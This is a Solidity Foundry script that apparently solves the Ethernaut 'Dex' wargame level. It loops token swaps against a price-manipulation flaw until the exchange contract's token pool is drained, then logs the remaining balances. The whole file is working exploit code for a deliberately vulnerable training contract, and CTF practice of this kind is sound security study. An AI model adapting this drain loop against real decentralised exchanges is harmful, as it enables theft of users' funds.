// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Dex} from "../../src/level-22/EthernautDex.sol";

contract DexSolution is Script {
    Dex dex = Dex(0xdd148030D4bdD15c8703F57E71cF6C28464D7Ec4);
    address token1 = dex.token1();
    address token2 = dex.token2();
    address myAddress = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        dex.approve(address(dex), type(uint256).max);
        for (uint i = 0; i < 100; i++) {
            if (dex.balanceOf(token1, address(dex)) == 0) {
                break;
            }
            uint256 myToken1 = dex.balanceOf(token1, myAddress);
            if (myToken1 > dex.balanceOf(token1, address(dex))) {
                uint256 _myToken1 = dex.balanceOf(token1, address(dex));
                dex.swap(token1, token2, _myToken1);
                continue;
            }
            if (myToken1 > 0) {
                dex.swap(token1, token2, myToken1);
            }

            if (dex.balanceOf(token2, address(dex)) == 0) {
                break;
            }
            uint256 myToken2 = dex.balanceOf(token2, myAddress);
            if (myToken2 > dex.balanceOf(token2, address(dex))) {
                uint256 _myToken2 = dex.balanceOf(token2, address(dex));
                dex.swap(token2, token1, _myToken2);
                continue;
            }
            if (myToken2 > 0) {
                dex.swap(token2, token1, myToken2);
            }
        }
        vm.stopBroadcast();
        console.log(
            "Current token1 balance in dex contract",
            dex.balanceOf(token1, address(dex))
        );
        console.log(
            "Current token2 balance in dex contract",
            dex.balanceOf(token2, address(dex))
        );
    }
}
